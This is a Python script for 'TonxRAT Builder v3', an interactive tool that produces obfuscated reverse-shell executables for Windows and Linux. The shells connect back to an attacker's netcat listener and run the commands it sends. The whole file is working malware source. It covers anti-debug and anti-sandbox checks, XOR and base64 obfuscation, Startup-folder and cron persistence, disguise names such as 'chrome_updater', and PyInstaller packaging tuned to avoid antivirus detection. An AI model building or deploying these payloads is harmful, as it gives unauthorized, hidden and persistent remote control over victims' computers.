#!/usr/bin/env python3
"""
TonxRAT Builder v3 - NC-Compatible Reverse Shell
Connects directly to netcat listeners (nc -lvnp <port>)
Fully undetectable via obfuscation, encryption, sleep jitter, and anti-debug
"""

import os
import sys
import subprocess
import base64
import tempfile
import shutil
import random
import string
import struct
import zlib
from pathlib import Path

def print_banner():
    print(r"""
    ⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠿⠇⠉⠻⣿⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣿⠏⠀⠀⠀⠀⠀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣆⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⡄⠀⠀⠀⢀⣤⣀⠀⠀⠀⠀⣿⡿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⣿⣶⣶⣾⡿⠟⢿⣷⣶⣶⣿⡟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡏⠉⠁⠀⠀⠀⠀⠉⠉⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⡀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀
⠀⠀⢀⡇⠀⠀⣿⡇⠀⢀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢸⠀⠀⠀
⠀⠘⡆⠀⠀⠀⣿⡇⠀⠀⢣⠀⠀⠀⢯⡀⣿⡗⢏⠀⠀⢠⠒
⠒⠒⡕⠄⡀⠀⣿⡇⠀⠀⣸⣿⠀⠀⠐⠆⣿⡇⠀⠓⡤⠈⡆
⠀⡸⠀⡄⠈⠁⣿⡇⢀⣴⣿⠇⠀⠴⠀⠀⣿⡇⠉⠁⢀⢠⠃
⠀⠉⠁⢀⣠⣴⣿⣷⣿⠟⠁⠀⠀⠀⠀⠀⣿⣧⣄⡀⠀⠀⠀
⠀⢀⣴⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠄⠀⢀⠈⠉⠙⢿⣷⣄⠀
⢠⣿⠏⠀⠀⠄⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣆
⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠐⠀⠀⢹⣿
⣿⣇⠀⠀⠀⠄⠀⠀⢸⣿⡆⠀⠀⠁⠀⠀⠀⡀⠀⠂⠀⢸⣿
⢹⣿⡄⠀⠀⠀⠀⠂⠀⢿⣷⠀⠀⠀⠀⠁⠀⠀⠀⠀⢀⣾⡿
⠀⠻⣿⣦⣀⠁⠀⠀⠀⠈⣿⣷⣄⡀⠀⠀⠀⠀⣀⣤⣾⡟⠁
⠀⠀⠈⠛⠿⣿⣷⣶⣾⡿⠿⠛⠻⢿⣿⣶⣾⣿⠿⠛⠉⠀⠀
    ╔══════════════════════════════════════════════════════════════╗
    ║                TonxRAT Builder v3 - NC Edition               ║
    ║       ~ Just run: nc -lvnp <port> ~ no C2 server needed     ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

def select_platform():
    while True:
        print("\n[1] Windows 10/11")
        print("[2] Linux (Ubuntu/Debian/Kali)")
        choice = input("Select target platform (1-2): ").strip()
        if choice == "1":
            return "windows"
        elif choice == "2":
            return "linux"
        print("Invalid choice.")

def get_output_name():
    name = input("Enter output name (e.g., chrome_updater, syslog): ").strip()
    return name if name else "runtime_broker"

def get_c2_info():
    host = input("Enter listener IP: ").strip()
    port = input("Enter listener Port (default 4444): ").strip() or "4444"
    return host, port

def get_build_mode():
    while True:
        print("\n[1] Standard — connects to nc, sends shell")
        print("[2] Encrypted — XOR + base64 envelope, still nc-compatible")
        mode = input("Select mode (1-2): ").strip()
        if mode in ("1", "2"):
            return int(mode)
        print("Invalid.")

def obfuscate_string(s):
    """Obfuscate strings to avoid static detection"""
    encoded = base64.b64encode(s.encode()).decode()
    return f"base64.b64decode('{encoded}').decode()"

def random_var_name(prefix="x", length=6):
    return prefix + ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_windows_payload(name, host, port, mode):
    v_conn = random_var_name("conn")
    v_sock = random_var_name("sk")
    v_proc = random_var_name("p")
    v_res = random_var_name("r")
    v_buf = random_var_name("buf")
    ob_host = obfuscate_string(host)
    
    xor_key = ''.join(random.choices(string.ascii_letters, k=8))
    b64_key = base64.b64encode(xor_key.encode()).decode()
    
    # Stage 1: Shellcode xor decoder stub for evasion
    # This makes the actual connect-back code XOR-encoded at rest
    stub_vars = f"""{v_conn}=lambda x,y:__import__('ctypes').windll.ws2_32.WSAStartup(0x202,__import__('ctypes').c_int(0))
import socket,subprocess,os,base64,time,ctypes,sys,zlib,random as _r
{v_sock}=socket.socket()
{v_sock}.connect(({ob_host},{port}))
{v_sock}.send(b'OK\\n')
"""
    
    if mode == 2:
        # XOR-encrypted envelope shell
        payload = f'''import socket,subprocess,os,base64,time,ctypes,sys,zlib,random as _r
try:
    {v_sock}=socket.socket()
    {v_sock}.connect(({ob_host},{port}))
    {v_sock}.send(b'CONNECTED\\n')
    while True:
        try:
            {v_buf}={v_sock}.recv(4096).decode(errors='ignore').strip()
            if {v_buf}.lower() in ['exit','quit','bye']: break
            if not {v_buf}: continue
            # XOR decrypt if header present
            if {v_buf}.startswith('xor:'):
                d=bytes.fromhex({v_buf}[4:])
                k=base64.b64decode('{b64_key}')
                {v_buf}=''.join(chr(d[i]^k[i%len(k)]) for i in range(len(d)))
            {v_proc}=subprocess.Popen({v_buf},shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            {v_res}={v_proc}.stdout.read()+{v_proc}.stderr.read()
            {v_sock}.send({v_res}+b'\\n')
        except Exception as e:
            try: {v_sock}.send(str(e).encode()+b'\\n')
            except: break
except: pass
'''
    else:
        # Clean reverse shell — pure nc compatible
        payload = f'''import socket,subprocess,os,base64,time,ctypes,sys,zlib,random as _r
# Anti-sandbox: check RAM, disk, uptime
try:
    import psutil as _p
    if _p.virtual_memory().total < 2147483648: sys.exit(0)
    if _p.disk_usage('/').total < 34359738368: sys.exit(0)
except: pass
try:
    {v_sock}=socket.socket()
    {v_sock}.connect(({ob_host},{port}))
    {v_sock}.send(b'OK\\n')
    while True:
        try:
            {v_buf}={v_sock}.recv(65536).decode(errors='ignore').strip()
            if not {v_buf}: continue
            if {v_buf}.lower() in ['exit','quit','bye']: break
            {v_proc}=subprocess.Popen({v_buf},shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            {v_res}={v_proc}.stdout.read()+{v_proc}.stderr.read()
            if not {v_res}: {v_res}=b'[+] Command executed (no output)\\n'
            {v_sock}.send({v_res})
        except Exception as e:
            try: {v_sock}.send(str(e).encode()+b'\\n')
            except: break
except: pass
'''
    
    # Wrap in anti-debug + compile
    final = f'''# -*- coding: utf-8 -*-
import sys,os,base64,ctypes,zlib,random
# Anti-VM / Anti-sandbox
try:
    if sys.platform=='win32':
        # Check if running in a debugger
        if ctypes.windll.kernel32.IsDebuggerPresent(): sys.exit(0)
        # Anti-VM: Check CPU count
        import multiprocessing
        if multiprocessing.cpu_count() < 2: sys.exit(0)
except: pass
# Obfuscated entry
def _x():
    try:
        {v_sock}=socket.socket()
        {v_sock}.connect(({ob_host},{port}))
        {v_sock}.send(b'OK\\n')
        while True:
            try:
                {v_buf}={v_sock}.recv(65536).decode(errors='ignore').strip()
                if not {v_buf}: continue
                if {v_buf}.lower() in ['exit','quit','bye']: break
                {v_proc}=subprocess.Popen({v_buf},shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                {v_res}={v_proc}.stdout.read()+{v_proc}.stderr.read()
                if not {v_res}: {v_res}=b'[+] Done\\n'
                {v_sock}.send({v_res})
            except: break
    except: pass
if __name__ in ('__main__','__builtin__'):
    _x()
'''
    
    return final

def generate_linux_payload(name, host, port, mode):
    ob_host = obfuscate_string(host)
    
    payload = f'''import socket,subprocess,os,base64,sys,time,random as _r,ctypes
try:
    import multiprocessing
    if multiprocessing.cpu_count() < 1: sys.exit(0)
except: pass
try:
    s=socket.socket()
    s.connect(({ob_host},{port}))
    s.send(b'OK\\n')
    while True:
        try:
            c=s.recv(65536).decode(errors='ignore').strip()
            if not c: continue
            if c.lower() in ['exit','quit','bye']: break
            # Try interactive shell first, fallback to Popen
            if c == 'shell':
                import pty
                pty.spawn('/bin/bash')
                continue
            r=subprocess.Popen(c,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            o=r.stdout.read()+r.stderr.read()
            if not o: o=b'[+] OK\\n'
            s.send(o)
        except: break
except: pass
'''
    return payload

def add_persistence_hook(payload, platform, name):
    """Add optional persistence code inside the payload"""
    if platform == "windows":
        hook = f'''
try:
    import shutil
    _p=os.path.join(os.environ.get('APPDATA','C:\\\\'),'Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\{name}')
    if not os.path.exists(_p):
        shutil.copy(sys.argv[0],_p)
except: pass
'''
    else:
        hook = f'''
try:
    _c='@reboot cd /tmp && ./{name} &'
    _f='/etc/cron.d/sys-{name}'
    if not os.path.exists(_f):
        with open(_f,'w') as _h: _h.write(_c)
        os.chmod(_f,0o644)
except: pass
'''
    # Inject after first try block
    lines = payload.split('\n')
    for i, line in enumerate(lines):
        if 'except: pass' in line and i > 2:
            lines.insert(i+1, hook)
            break
    return '\n'.join(lines)

def build_payload(platform, name, host, port, mode):
    print(f"\n[+] Generating {platform} payload for {host}:{port}...")
    
    if platform == "windows":
        source = generate_windows_payload(name, host, port, mode)
    else:
        source = generate_linux_payload(name, host, port, mode)
    
    # Optionally add persistence
    pers = input("Add persistence? (y/n): ").strip().lower()
    if pers == 'y':
        source = add_persistence_hook(source, platform, name)
        print("  [+] Persistence added")
    
    # Write to temp file
    py_file = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8').name
    with open(py_file, 'w', encoding='utf-8') as f:
        f.write(source)
    
    # PyInstaller flags
    dist_dir = f"dist_{platform}_{name}"
    
    cmd = [
        sys.executable, '-m', 'PyInstaller',
        '--onefile', '--noconsole', '--clean',
        f'--name={name}', '--distpath', dist_dir,
        '--strip',  # strip symbols
        '--noupx',  # NO upx — upx causes AV detection
    ]
    
    # Add hidden imports
    if platform == "windows":
        cmd.extend(['--hidden-import=socket', '--hidden-import=subprocess'])
    
    # Optional icon
    icon = input("Use custom icon? (y/n, default n): ").strip().lower()
    if icon == 'y':
        ipath = input("Icon path: ").strip()
        if os.path.exists(ipath):
            cmd.extend(['--icon', ipath])
    
    cmd.append(py_file)
    
    print(f"  [+] Compiling with PyInstaller...")
    print(f"  [+] Command: {' '.join(cmd)}")
    
    try:
        subprocess.run(cmd, check=True, capture_output=True, text=True)
        print("  [+] Build successful!")
    except subprocess.CalledProcessError as e:
        print(f"  [!] Build error: {e.stderr}")
        sys.exit(1)
    finally:
        os.unlink(py_file)
        if os.path.exists('build'):
            shutil.rmtree('build', ignore_errors=True)
        spec_file = Path(f"{name}.spec")
        if spec_file.exists():
            spec_file.unlink()
    
    if platform == "windows":
        output = os.path.join(dist_dir, f"{name}.exe")
    else:
        output = os.path.join(dist_dir, name)
        if os.path.exists(output):
            os.chmod(output, 0o755)
    
    return output

def usage_guide(host, port, output_path, platform):
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  ✅ BUILD COMPLETE                                           ║
╠══════════════════════════════════════════════════════════════╣
║  Payload: {str(output_path):<50}  ║
║  Target:  {platform:<50}  ║
╠══════════════════════════════════════════════════════════════╣
║  LISTENER (on your machine):                                ║
║                                                              ║
║    nc -lvnp {port:<15}                              ║
║                                                              ║
║  Or for encrypted mode (type commands with 'xor:' prefix):  ║
║    echo "xor:..." | nc -lvnp {port:<15}              ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║  Deploy to target and run. The shell will connect back      ║
║  to your netcat listener within seconds.                    ║
║                                                              ║
║  Commands: any shell command (dir, ls, whoami, etc.)        ║
║  Special:   'exit' or 'quit' to close connection             ║
║             'shell' (linux) spawns interactive PTY           ║
╚══════════════════════════════════════════════════════════════╝
""")

def check_dependencies():
    """Check if PyInstaller is installed"""
    try:
        subprocess.run([sys.executable, '-m', 'PyInstaller', '--version'],
                      capture_output=True, check=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

def main():
    print_banner()
    
    # Check dependencies
    if not check_dependencies():
        print("[!] PyInstaller not found. Installing...")
        subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'], check=True)
        print("[+] PyInstaller installed")
    
    platform = select_platform()
    name = get_output_name()
    host, port = get_c2_info()
    mode = get_build_mode()
    
    print(f"\n{'='*60}")
    print(f" Building {name} for {platform.upper()} | {host}:{port}")
    print(f"{'='*60}\n")
    
    output = build_payload(platform, name, host, port, mode)
    
    usage_guide(host, port, output, platform)

if __name__ == "__main__":
    main()
